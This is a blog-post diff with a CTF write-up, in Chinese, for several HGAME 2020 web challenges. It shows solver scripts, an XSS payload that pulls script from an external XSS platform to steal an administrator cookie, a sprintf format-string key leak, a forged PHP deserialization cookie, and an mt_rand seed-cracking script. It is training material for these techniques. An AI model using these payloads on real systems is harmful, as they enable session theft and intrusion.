+<h2 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h2><p>访问/mycode，发现加密函数encrypt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function encrypt($str)&#123;</span><br><span class="line">    $result &#x3D; &#39;&#39;;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; strlen($str); $i++)&#123;</span><br><span class="line">        $result .&#x3D; chr(ord($str[$i]) + 1);</span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo(strrev(str_rot13(encrypt(strrev(base64_encode(base64_encode(str_rot13(encrypt(base64_encode(strrev($_SERVER[&#39;token&#39;])))))))))));</span><br><span class="line"></span><br><span class="line">if(@$_POST[&#39;token&#39;] &#x3D;&#x3D;&#x3D; $_SERVER[&#39;token&#39;])&#123;</span><br><span class="line">    echo($_SERVER[&#39;flag&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>写出解密函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function decrypt($str)&#123;</span><br><span class="line">    $result &#x3D; &#39;&#39;;</span><br><span class="line">    for($i &#x3D; 0; $i&lt;strlen($str); $i++)&#123;</span><br><span class="line">        $result .&#x3D; chr(ord($str[$i]) - 1);</span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因为加密过程是动态的，所以给出动态解密脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import queue</span><br><span class="line">def reverse(s):</span><br><span class="line">    return s[::-1]</span><br><span class="line">def rot13(s, OffSet&#x3D;13):</span><br><span class="line">    def encodeCh(ch):</span><br><span class="line">         ch&#x3D;str(ch)</span><br><span class="line">         f&#x3D;lambda x: chr((ord(ch)-x+OffSet) % 26 + x)</span><br><span class="line">         return f(97) if ch.islower() else (f(65) if ch.isupper() else ch)</span><br><span class="line">    return str(&#39;&#39;.join(encodeCh(c) for c in s))</span><br><span class="line">def decrypt(s):</span><br><span class="line">    # print(s)</span><br><span class="line">    result&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(len(s)):</span><br><span class="line">        # print(i,s[i])</span><br><span class="line">        result&#x3D;result+chr(ord(str(s[i]))-1)</span><br><span class="line">    return result</span><br><span class="line">sess&#x3D;requests.Session()</span><br><span class="line">miwen&#x3D;sess.get(&quot;http:&#x2F;&#x2F;6a57b5cbe5.php.hgame.n3ko.co&quot;).text</span><br><span class="line"># print(miwen)</span><br><span class="line">miwen&#x3D;miwen.replace(r&#39;&#39;&#39;&lt;html&gt;&lt;head&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;code&gt;&lt;span style&#x3D;&quot;color: #000000&quot;&gt;</span><br><span class="line">&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;&lt;?php&lt;br&gt;highlight_file&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;__FILE__&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;);&lt;br&gt;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$code&amp;nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;&#x3D;&amp;nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;file_get_contents&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #DD0000&quot;&gt;&#39;mycode&#39;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;);&lt;br&gt;eval(&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$code&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;);&lt;br&gt;&lt;br&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;code&gt;&lt;br&gt;&#39;&#39;&#39;,&#39;&#39;).replace(&#39;&lt;br&gt;&#39;,&#39;&#39;).replace(&#39;&lt;&#x2F;body&gt;&#39;,&#39;&#39;).replace(&#39;&lt;&#x2F;html&gt;&#39;,&#39;&#39;).replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line">print(&quot;密文：&quot;,miwen)</span><br><span class="line">a&#x3D;sess.get(&quot;http:&#x2F;&#x2F;6a57b5cbe5.php.hgame.n3ko.co&#x2F;mycode&quot;).text</span><br><span class="line">s&#x3D;a.replace(r&#39;&#39;&#39;function encrypt($str)&#123;</span><br><span class="line">    $result &#x3D; &#39;&#39;;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; strlen($str); $i++)&#123;</span><br><span class="line">        $result .&#x3D; chr(ord($str[$i]) + 1);</span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line">&#39;&#39;&#39;,&#39;&#39;).replace(r&#39;&#39;&#39;</span><br><span class="line">if(@$_POST[&#39;token&#39;] &#x3D;&#x3D;&#x3D; $_SERVER[&#39;token&#39;])&#123;</span><br><span class="line">    echo($_SERVER[&#39;flag&#39;]);</span><br><span class="line">&#125;&#39;&#39;&#39;,&#39;&#39;).replace(&#39;;&#39;,&#39;&#39;).replace(&#39;echo(&#39;,&#39;&#39;).replace(&#39;\n&#39;,&#39;&#39;).replace(&#39; &#39;,&#39;&#39;)</span><br><span class="line">print(&quot;加密函数:&quot;,s)</span><br><span class="line">sentense&#x3D;&#39;\&quot;&#39;+miwen+&#39;\&quot;&#39;</span><br><span class="line">while (&#39;(&#39; in s):</span><br><span class="line">    if s.startswith(&quot;encrypt&quot;):</span><br><span class="line">        s&#x3D;s[8:]</span><br><span class="line">        sentense&#x3D;&quot;decrypt(&quot;+str(sentense)+&quot;)&quot;</span><br><span class="line">        print(sentense,eval(sentense))</span><br><span class="line">    elif s.startswith(&quot;str_rot13&quot;):</span><br><span class="line">        s&#x3D;s[10:]</span><br><span class="line">        sentense&#x3D;&quot;rot13(&quot;+str(sentense)+&quot;)&quot;</span><br><span class="line">        print(sentense,eval(sentense))</span><br><span class="line">    elif s.startswith(&quot;strrev&quot;):</span><br><span class="line">        s&#x3D;s[7:]</span><br><span class="line">        sentense&#x3D;&quot;reverse(&quot;+str(sentense)+&quot;)&quot;</span><br><span class="line">        print(sentense,eval(sentense))</span><br><span class="line">    elif s.startswith(&quot;base64_encode&quot;):</span><br><span class="line">        s&#x3D;s[14:]</span><br><span class="line">        sentense&#x3D;&quot;base64.b64decode(&quot;+str(sentense)+&quot;).decode(&#39;utf-8&#39;)&quot;</span><br><span class="line">        print(sentense,eval(sentense))</span><br><span class="line">print(sentense)</span><br><span class="line">result&#x3D;eval(sentense)</span><br><span class="line">print(str(result))</span><br><span class="line">data&#x3D;&#123;</span><br><span class="line">    &quot;token&quot;:result</span><br><span class="line">&#125;</span><br><span class="line">q&#x3D;sess.post(&quot;http:&#x2F;&#x2F;6a57b5cbe5.php.hgame.n3ko.co&#x2F;index.php&quot;,data)</span><br><span class="line">print(q.text)</span><br></pre></td></tr></table></figure>
+<h2 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h2><p>先给出解密code的脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">def md5vale(key):</span><br><span class="line">    input_name &#x3D; hashlib.md5()</span><br><span class="line">    input_name.update(key.encode(&quot;utf-8&quot;))</span><br><span class="line">    return input_name.hexdigest()</span><br><span class="line">for i in range(5000000,100000000000):</span><br><span class="line">    a&#x3D;str(md5vale(str(i)))</span><br><span class="line">    # print(i)</span><br><span class="line">    if(a[:6]&#x3D;&#x3D;&quot;六位数字&quot;):</span><br><span class="line">        print(&quot;md5(%d)&#x3D;%s&quot;%(i,a))</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+<p>XSS的题我就没做出来过，尝试根据wp复现</p>
+<p>参考文章</p>
+<p><a href="https://blog.csdn.net/stepone4ward/article/details/104173443" target="_blank" rel="noopener">https://blog.csdn.net/stepone4ward/article/details/104173443</a></p>
+<p>首先双尖括号被过滤，script也被过滤，这里采用html实体编码绕过</p>
+<p>原始payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;&quot;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;http:&#x2F;&#x2F;xsspt.com&#x2F;yourcode?&#39;+Math.random()&quot;</span><br></pre></td></tr></table></figure>
+<p>进行HTML实体编码，得到管理员cookie为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f802788a02a51f9c624bb5d91815b</span><br></pre></td></tr></table></figure>
+<p>替换自己的cookie得到flag即可</p>
+<h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="序列之争"><a href="#序列之争" class="headerlink" title="序列之争"></a>序列之争</h2><p>访问首页，查看源代码，发现source.zip,下载下来进行审计</p>
+<p>根据名字猜测是反序列化,发现反序列化函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$monsterData &#x3D; base64_decode($_COOKIE[&#39;monster&#39;]);</span><br><span class="line">if(strlen($monsterData) &gt; 32)&#123;</span><br><span class="line">    $sign &#x3D; substr($monsterData, -32);</span><br><span class="line">    $monsterData &#x3D; substr($monsterData, 0, strlen($monsterData) - 32);</span><br><span class="line">    if(md5($monsterData . $this-&gt;encryptKey) &#x3D;&#x3D;&#x3D; $sign)&#123;</span><br><span class="line">        $this-&gt;monsterData &#x3D; unserialize($monsterData);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        session_start();</span><br><span class="line">        session_destroy();</span><br><span class="line">        setcookie(&#39;monster&#39;, &#39;&#39;);</span><br><span class="line">        header(&#39;Location: index.php&#39;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>sign是$_COOKIE[‘monster’]base64解码后的后32位</p>
+<p>$monsterData是$_COOKIE[‘monster’]base64解码后32位前面的部分<br>只要满足以下条件即可实现反序列化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5($monsterData . $this-&gt;encryptKey) &#x3D;&#x3D;&#x3D; $sign</span><br></pre></td></tr></table></figure>
+<p>monsterData和sign都可以控制得到，现在需要知道$this-&gt;encryptKey的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function __construct($playerName)&#123;</span><br><span class="line">    $_SESSION[&#39;player&#39;] &#x3D; $playerName;</span><br><span class="line">    if(!isset($_SESSION[&#39;exp&#39;]))&#123;</span><br><span class="line">        $_SESSION[&#39;exp&#39;] &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    $data &#x3D; [$playerName, $this-&gt;encryptKey];</span><br><span class="line">    $this-&gt;init($data);</span><br><span class="line">    $this-&gt;monster &#x3D; new Monster($this-&gt;sign);</span><br><span class="line">    $this-&gt;rank &#x3D; new Rank();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>$this-&gt;encryptKey传入data数组，然后对data数组执行$this-&gt;init($data)方法，我们定位到init()方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private function init($data)&#123;</span><br><span class="line">    foreach($data as $key &#x3D;&gt; $value)&#123;</span><br><span class="line">        $this-&gt;welcomeMsg &#x3D; sprint($this-&gt;welcomeMsg, $value);</span><br><span class="line">        $this-&gt;sign .&#x3D; md5($this-&gt;sign . $value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现value会通过$this-&gt;welcomeMsg来获得，寻找发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public $welcomeMsg &#x3D; &#39;%s, Welcome to Ordinal Scale!&#39;;</span><br></pre></td></tr></table></figure>
+<p>如果我们输入的用户名为%s,就可以利用这里的sprintf()造成格式化输出漏洞函数，得到$this-&gt;encryptKey,于是我们输入用户名为%s,得到得到$this-&gt;encryptKey为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL</span><br></pre></td></tr></table></figure>
+<p>于是构造反序列化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Rank</span><br><span class="line">&#123;</span><br><span class="line">private $rank &#x3D; 1; </span><br><span class="line">private $serverKey; </span><br><span class="line">private $key;</span><br><span class="line">public function __construct()&#123; </span><br><span class="line">    $this-&gt;key &#x3D; &amp;$this-&gt;serverKey;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; [&#39;don&#39;, &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;];</span><br><span class="line">$sign &#x3D; &#39;&#39;;</span><br><span class="line">foreach($data as $value)&#123;</span><br><span class="line">    $sign .&#x3D; md5($sign . $value); </span><br><span class="line">&#125;</span><br><span class="line">$rank &#x3D; serialize(new Rank()); </span><br><span class="line">echo(base64_encode($rank . md5($rank . $sign)));</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0OiJSYW5rIjozOntzOjEwOiIAUmFuawByYW5rIjtpOjE7czoxNToiAFJhbmsAc2VydmVyS2V5IjtOO3M6OToiAFJhbmsAa2V5IjtSOjM7fWM2OWU4ZGUyMzY4Yjc0ZmI4NWNjMzEzZjlmMzY3ZjIy</span><br></pre></td></tr></table></figure>
+<p>替换token,得到flag</p>
+<p><img src="/2020/02/13/HGAME-2020/11.png" alt></p>
+<h2 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂"></a>二发入魂</h2><p>参考文章<br><a href="https://www.anquanke.com/post/id/196831" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196831</a></p>
+<p>给出大佬写的解密脚本，菜鸡凑活拿来用一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">url &#x3D; r&quot;https:&#x2F;&#x2F;twoshot.hgame.n3ko.co&#x2F;random.php?times&#x3D;228&quot;</span><br><span class="line">session &#x3D; requests.session()</span><br><span class="line">response &#x3D; session.get(url)</span><br><span class="line"># print(response.text)</span><br><span class="line">list &#x3D; response.text.replace(&#39;[&#39;,&#39;&#39;).replace(&#39;]&#39;,&#39;&#39;).split(&#39;,&#39;)</span><br><span class="line"># print(list)</span><br><span class="line">cmd &#x3D;os.popen(&quot;python3 reverse_mt_rand.py &quot;+list[0]+&quot; &quot;+list[227]+&quot; 0 0&quot;)</span><br><span class="line">seed &#x3D; cmd.read().strip()</span><br><span class="line">print(seed)</span><br><span class="line">cmd.close()</span><br><span class="line">urlv &#x3D; r&quot;https:&#x2F;&#x2F;twoshot.hgame.n3ko.co&#x2F;verify.php&quot;</span><br><span class="line">response2 &#x3D; session.post(urlv,data&#x3D;&#123;&#39;ans&#39;:seed&#125;)</span><br><span class="line">print(response2.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h2><p>注册登录后可以买东西，也可以卖东西，但是卖东西的钱少，买东西的钱多，总钱数肯定是只少不多，不会到一百亿，所以猜测存在条件竞争，利用burp小线程买东西，大线程卖东西，一会钱就够了，直接拿flag即可</p>
+<p>其他的稍后再进行复现</p>
+
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
     
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/29/CVE-2018-8715%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2020-01-29T13:45:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-29</time>
-</a>
+      <div class="declare" hidden="hidden"></div>
+    
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢您的打赏，大家一起加油喔~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/asserts/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/asserts/weixin.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/29/CVE-2018-8715%E5%A4%8D%E7%8E%B0/">CVE-2018-8715复现</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://yd0ng.github.io/2020/02/13/HGAME-2020/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/26/JISCTF%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="archive-article-date">
-  	<time datetime="2020-01-26T11:38:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-26</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/02/11/Python%E7%BC%96%E7%A8%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Python编程快速入门</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/26/JISCTF%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">JISCTF靶机渗透</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">靶机渗透</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Week1"><span class="toc-number">1.</span> <span class="toc-text">Week1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cosmos的博客"><span class="toc-number">1.1.</span> <span class="toc-text">Cosmos的博客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#接头霸王"><span class="toc-number">1.2.</span> <span class="toc-text">接头霸王</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-World"><span class="toc-number">1.3.</span> <span class="toc-text">Code World</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#🐔尼泰玫"><span class="toc-number">1.4.</span> <span class="toc-text">🐔尼泰玫</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week2"><span class="toc-number">2.</span> <span class="toc-text">Week2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cosmos的博客后台"><span class="toc-number">2.1.</span> <span class="toc-text">Cosmos的博客后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cosmos的留言板-1"><span class="toc-number">2.2.</span> <span class="toc-text">Cosmos的留言板-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cosmos的新语言"><span class="toc-number">2.3.</span> <span class="toc-text">Cosmos的新语言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cosmos的聊天室"><span class="toc-number">2.4.</span> <span class="toc-text">Cosmos的聊天室</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week3"><span class="toc-number">3.</span> <span class="toc-text">Week3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#序列之争"><span class="toc-number">3.1.</span> <span class="toc-text">序列之争</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二发入魂"><span class="toc-number">3.2.</span> <span class="toc-text">二发入魂</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cosmos的二手市场"><span class="toc-number">3.3.</span> <span class="toc-text">Cosmos的二手市场</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/26/ssh%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2020-01-26T09:48:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-26</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/26/ssh%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/">ssh密码暴力破解</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/14/CVE-2016-3088%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2020-01-14T12:48:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/14/CVE-2016-3088%E5%A4%8D%E7%8E%B0/">CVE-2016-3088复现</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
